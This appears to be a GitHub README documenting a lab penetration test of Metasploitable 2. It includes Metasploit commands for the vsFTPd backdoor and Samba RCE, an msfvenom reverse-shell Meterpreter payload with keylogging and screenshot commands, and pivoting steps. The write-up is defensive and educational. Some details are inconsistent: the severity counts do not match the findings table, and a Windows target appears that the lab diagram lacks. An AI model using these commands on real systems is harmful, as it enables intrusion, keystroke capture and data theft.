# 🔴 Red Team Lab Setup & Metasploitable Full Assessment

> ** May 2026**  
> *A complete, documented penetration testing engagement against Metasploitable 2 in an isolated VMware lab environment.*

---

## 🧑‍💻 Author

| Field | Details |
|-------|---------|
| **Name** | Md. Redowanul Haq |

---

## 📋 Project Overview

This project demonstrates a **full red team engagement lifecycle** — from building an isolated virtual lab, through enumeration and exploitation, to post-exploitation, pivoting, and reporting.

The **target** is Metasploitable 2, an intentionally vulnerable Linux machine used exclusively for educational and assessment purposes in a fully air-gapped VMware environment.

---

## 🏗️ Lab Architecture

```
┌─────────────────────────────────────────────────────────┐
│                    VMware Workstation                    │
│                                                         │
│  ┌──────────────────┐       ┌──────────────────────┐   │
│  │   Kali Linux     │       │   Metasploitable 2   │   │
│  │  (Attacker)      │◄─────►│   (Target)           │   │
│  │  192.168.50.2    │       │   192.168.50.3 (eth0)│   │
│  └──────────────────┘       │   10.10.10.5   (eth1)│   │
│                             └──────────────────────┘   │
│         VLan1: 192.168.50.0/24 (Host-only, isolated)   │
│         VLan2: 10.10.10.0/24  (Secondary subnet)       │
└─────────────────────────────────────────────────────────┘
```

---

## 🎯 Objectives

- [x] Design and deploy an isolated Red Team Lab (VMware Workstation)
- [x] Configure Kali Linux attacker and Metasploitable 2 target on private subnet
- [x] Full target enumeration (Nmap, Enum4linux, service fingerprinting)
- [x] Exploit critical vulnerabilities across FTP, SMB, HTTP, SSH, Telnet, MySQL
- [x] Establish Meterpreter sessions via custom payload (Windows target)
- [x] Post-exploitation: keylogging, screenshot capture, credential harvesting
- [x] Network pivoting to secondary subnet (10.10.10.0/24)
- [x] Traffic sniffing with Wireshark and Burp Suite
- [x] Password cracking with John the Ripper and Hydra
- [x] Professional pentest report with findings and remediation

---

## 🛠️ Tools Used

| Tool | Purpose |
|------|---------|
| **Kali Linux 2024** | Attacker operating system |
| **VMware Workstation** | Virtualization & network isolation |
| **Metasploitable 2** | Intentionally vulnerable target |
| **Nmap 7.99** | Port scanning, service & OS detection |
| **Metasploit Framework v6.4** | Exploitation framework, Meterpreter |
| **msfvenom** | Custom payload generation |
| **Burp Suite Community** | HTTP interception & web app testing |
| **Wireshark 4.6.4** | Network traffic capture & analysis |
| **John the Ripper** | Offline password hash cracking |
| **Hydra** | Online credential brute-forcing |
| **Enum4linux** | SMB share & user enumeration |
| **HFS (HTTP File Server)** | Payload hosting & delivery |

---

## 🔍 Target Enumeration

### Open Ports Discovered (nmap -Pn 192.168.50.3)

```
PORT      SERVICE      VERSION
21/tcp    ftp          vsFTPd 2.3.4
22/tcp    ssh          OpenSSH 4.7p1
23/tcp    telnet       Linux telnetd
25/tcp    smtp         Postfix smtpd
80/tcp    http         Apache httpd 2.2.8 (DVWA)
139/tcp   netbios-ssn  Samba 3.0.20-Debian
445/tcp   microsoft-ds Samba 3.0.20-Debian
512/tcp   exec
513/tcp   login
514/tcp   shell
3306/tcp  mysql        MySQL 5.0.51a
5432/tcp  postgresql
5900/tcp  vnc
6000/tcp  x11
6667/tcp  irc
```

---

## 💥 Vulnerabilities Found

| # | Service | Vulnerability | CVE | Severity | CVSS |
|---|---------|---------------|-----|----------|------|
| 1 | FTP | vsFTPd 2.3.4 Backdoor → Root Shell | CVE-2011-2523 | 🔴 Critical | 9.8 |
| 2 | SMB | Samba usermap_script RCE → Root Shell | CVE-2007-2447 | 🔴 Critical | 9.8 |
| 3 | HTTP | DVWA Command Injection → OS Execution | CWE-78 | 🔴 Critical | 9.8 |
| 4 | SSH | Default Credentials (msfadmin:msfadmin) | CWE-798 | 🔴 Critical | 9.1 |
| 5 | MySQL | No Root Password → Full DB Access | CWE-521 | 🔴 Critical | 9.1 |
| 6 | Windows | Meterpreter via msfvenom + HFS Delivery | N/A | 🔴 Critical | 9.0 |
| 7 | SSH/FTP | Password Cracking (/etc/shadow) | CWE-521 | 🟠 High | 7.5 |
| 8 | Network | Pivoting via Dual-Homed Host (10.10.10.x) | MITRE T1021 | 🟠 High | 7.5 |
| 9 | Sniffing | Cleartext Credential Interception | CWE-319 | 🟠 High | 7.5 |
| 10 | Telnet | Cleartext Protocol / No Encryption | CWE-319 | 🟡 Medium | 5.3 |
| 11 | FTP | Anonymous Login Enabled | N/A | 🟡 Medium | 5.3 |

### Summary

| 🔴 Critical | 🟠 High | 🟡 Medium | 🟢 Low | ℹ️ Info |
|:-----------:|:-------:|:---------:|:------:|:-------:|
| 6 | 3 | 2 | 1 | 2 |

---

## 🧪 Exploitation Highlights

### 1. vsFTPd 2.3.4 Backdoor (CVE-2011-2523)
```bash
msf6 > use exploit/unix/ftp/vsftpd_234_backdoor
msf6 exploit(vsftpd_234_backdoor) > set RHOSTS 192.168.50.3
msf6 exploit(vsftpd_234_backdoor) > run
# [*] Command shell session opened → root@metasploitable
```

### 2. Samba usermap_script RCE (CVE-2007-2447)
```bash
msf6 > use exploit/multi/samba/usermap_script
msf6 exploit(usermap_script) > set RHOSTS 192.168.50.3
msf6 exploit(usermap_script) > run
# [*] Command shell session opened → root@metasploitable
```

### 3. Windows Meterpreter via Custom Payload
```bash
# Generate payload
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.50.2 LPORT=4444 -f exe > payload.exe

# Set up listener
msf6 > use exploit/multi/handler
msf6 > set PAYLOAD windows/meterpreter/reverse_tcp

# Post-exploitation
meterpreter > keyscan_start
meterpreter > keyscan_dump
meterpreter > screenshot
```

### 4. Network Pivoting
```bash
# After gaining Meterpreter on Metasploitable
meterpreter > ipconfig
# Interface 3: eth1 — 10.10.10.5 (secondary network discovered!)

msf6 > route add 10.10.10.0/24 [session_id]
msf6 > use auxiliary/scanner/portscan/tcp
# Scan previously unreachable 10.10.10.0/24 through the pivot
```

---

## 🛡️ Key Remediation Recommendations

1. **Patch immediately** — vsFTPd 2.3.4 and Samba 3.0.20 have public RCE exploits
2. **Change all default credentials** — msfadmin:msfadmin is a known credential pair
3. **Disable cleartext protocols** — Replace Telnet with SSH, FTP with SFTP
4. **Enforce password policy** — Minimum 12 chars, MFA where possible
5. **Firewall & segmentation** — Block unnecessary ports; firewall between subnets
6. **MySQL hardening** — Set strong root password; restrict to localhost
7. **Remove DVWA** — Do not run intentionally vulnerable apps in non-isolated environments
8. **Enable logging & monitoring** — SIEM, IDS/IPS, anomaly detection

---

## 📁 Repository Structure

```
📂 Red-Team-Lab-Metasploitable-Assessment/
├── 📄 README.md                          ← This file
├── 📄 Red_Team_Lab_Assessment_Report.docx ← Full professional pentest report
├── 📂 Screenshots/
│   ├── 📂 Lab_Environment_Setup/         ← VMware lab configuration
│   ├── 📂 FTP/                           ← FTP enumeration & exploitation
│   ├── 📂 SSH/                           ← SSH access & Metasploit
│   ├── 📂 SMB/                           ← Samba exploitation
│   ├── 📂 HTTP/                          ← DVWA & Apache exploitation
│   ├── 📂 Telnet/                        ← Telnet session & sniffing
│   ├── 📂 MySql/                         ← MySQL root access
│   ├── 📂 Password_Cracking/             ← John the Ripper / Hydra
│   ├── 📂 Pivoting/                      ← Network pivot to 10.10.10.x
│   ├── 📂 Sniffing/                      ← Wireshark captures
│   ├── 📂 Sniffing_with_Burp/            ← Burp Suite HTTP interception
│   └── 📂 Windows_Payload+HFS/          ← Meterpreter Windows exploitation
```

---

## ⚠️ Disclaimer

> All activities documented in this project were conducted **exclusively in an isolated, locally-hosted virtual lab environment** for **educational purposes**.  
> No external, production, or third-party systems were targeted or affected.  
> This project complies with ethical hacking principles and responsible disclosure standards.

---

## 📜 Methodology Reference

- OWASP Testing Guide v4.2
- PTES (Penetration Testing Execution Standard)
- NIST SP 800-115 — Technical Guide to Information Security Testing
- MITRE ATT&CK Framework

---

*© 2026 Md. Redowanul Haq Rafi*
